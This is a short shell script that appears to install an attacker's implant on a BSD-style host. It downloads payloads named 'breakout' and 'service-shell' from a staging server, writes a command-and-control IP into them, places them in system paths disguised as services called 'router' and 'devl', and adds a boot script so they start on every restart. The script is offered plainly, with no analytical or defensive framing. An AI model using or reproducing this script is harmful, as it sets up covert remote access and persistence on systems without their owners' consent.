#!/bin/sh

stagingIP=""
c2IP=""

curl ${stagingIP}:8000/breakout/breakout.sh | sed 's/destIP=""/destIP='\'${c2IP}\''/g' > /usr/bin/router
chmod +x /usr/bin/router
curl ${stagingIP}:8000/breakout/breakout -o /etc/rc.d/router
chmod +x /etc/rc.d/router

curl ${stagingIP}:8000/service-shell/service-shell | sed 's/$i=\\"\\"/$i=\\'\"${c2IP}\\\\\"'/g' > /etc/rc.d/devl
chmod +x /etc/rc.d/devl

echo "#!/bin/sh" > /usr/local/etc/rc.d/initsys.sh
echo "service router start" >> /usr/local/etc/rc.d/initsys.sh
echo "service devl start" >> /usr/local/etc/rc.d/initsys.sh
chmod +x /usr/local/etc/rc.d/initsys.sh

service router start
service devl start